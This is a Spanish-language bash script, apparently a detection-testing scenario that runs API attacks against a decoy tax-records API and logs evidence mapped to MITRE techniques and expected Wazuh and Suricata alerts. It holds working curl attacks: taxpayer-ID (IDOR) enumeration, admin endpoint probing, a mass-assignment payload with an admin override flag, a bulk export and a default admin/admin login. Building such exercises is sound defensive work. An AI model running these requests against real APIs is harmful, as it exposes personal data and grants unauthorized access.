#!/bin/bash
# ============================================================================
# Escenario S07: API Abuse - IDOR + Mass-Assignment (T1078)
# ============================================================================
# Herramientas: curl, python (Burp alternative)
# Target: Decoy API (contribución original)
# ============================================================================

set -e
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EVIDENCE_DIR="$SCRIPT_DIR/evidencia"
mkdir -p "$EVIDENCE_DIR"

DECOY_API="http://10.20.0.20:8000"
TIMESTAMP=$(date -u +"%Y%m%dT%H%M%SZ")

echo "=========================================="
echo "S07: API Abuse - IDOR (T1078)"
echo "Timestamp: $TIMESTAMP"
echo "=========================================="

echo "$TIMESTAMP" > "$EVIDENCE_DIR/start_time.txt"

# 1. IDOR (Insecure Direct Object Reference) - Enumerate other users' NITs
echo "[*] Fase 1: IDOR enumeration"
for NIT in 10000001001 10000002002 10000003003 10000004004 99999999999 00000000000 12345678; do
    curl -s "$DECOY_API/api/v1/contribuyentes/$NIT" -o "$EVIDENCE_DIR/idor_$NIT.json"
done

# 2. Admin endpoint access (T1078 - Valid Accounts)
echo "[*] Fase 2: Admin endpoint enumeration"
for endpoint in users config logs system/passwd; do
    safe=$(echo "$endpoint" | tr '/' '_')
    curl -s "$DECOY_API/api/v1/admin/$endpoint" -o "$EVIDENCE_DIR/admin_$safe.json"
done

# 3. Mass-assignment attempt on declaración jurada
echo "[*] Fase 3: Mass-assignment en declaración jurada"
curl -s -X POST "$DECOY_API/api/v1/declaraciones/" \
    -H "Content-Type: application/json" \
    -d '{
        "nit_contribuyente": "10234567891",
        "periodo": "2024-12",
        "tipo_declaracion": "IVA",
        "lineas": [{"codigo_formulario": "F-100", "monto": 100, "descripcion": "test"}],
        "_admin_override": true,
        "_is_internal": true,
        "estado": "APROBADA"
    }' -o "$EVIDENCE_DIR/mass_assignment.json"

# 4. Data export endpoint
echo "[*] Fase 4: Bulk data export"
curl -s "$DECOY_API/api/v1/admin/export-all" -o "$EVIDENCE_DIR/data_export.json"

# 5. JWT manipulation
echo "[*] Fase 5: JWT analysis (fake token)"
LOGIN_RESP=$(curl -s -X POST "$DECOY_API/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"admin"}')
echo "$LOGIN_RESP" > "$EVIDENCE_DIR/login_response.json"

# Extract token and try admin endpoints
TOKEN=$(echo "$LOGIN_RESP" | python3 -c "import sys, json; print(json.load(sys.stdin).get('access_token', ''))" 2>/dev/null || echo "")
if [ -n "$TOKEN" ]; then
    curl -s "$DECOY_API/api/v1/admin/users" -H "Authorization: Bearer $TOKEN" \
        -o "$EVIDENCE_DIR/admin_with_token.json"
fi

END_TIME=$(date -u +"%Y%m%dT%H%M%SZ")
echo "$END_TIME" > "$EVIDENCE_DIR/end_time.txt"

cat > "$EVIDENCE_DIR/resultados.json" <<EOF
{
  "scenario": "S07-api-abuse",
  "technique_id": "T1078",
  "technique_name": "Valid Accounts",
  "tactic": "Initial Access",
  "timestamp_start": "$TIMESTAMP",
  "timestamp_end": "$END_TIME",
  "tools_used": ["curl", "python3"],
  "targets_scanned": ["$DECOY_API/api/v1/admin/export-all", "$DECOY_API/api/v1/contribuyentes/"],
  "sub_techniques": [
    "T1078.001 Default Accounts",
    "T1213 Data from Information Repositories",
    "T1530 Data from Cloud Storage Object",
    "Mass-Assignment in DJ endpoint"
  ],
  "evidence_files": [
    "idor_*.json",
    "admin_*.json",
    "mass_assignment.json",
    "data_export.json",
    "login_response.json"
  ],
  "expected_detection": [
    "Decoy API: attack_logger (T1078, T1213, T1530)",
    "Wazuh rule 100203 (admin endpoint)",
    "Suricata rule 2024050, 2024051"
  ],
  "iso27035_phase": "Detection and Reporting (Phase 2)"
}
EOF

echo "[OK] Escenario S07 ejecutado."
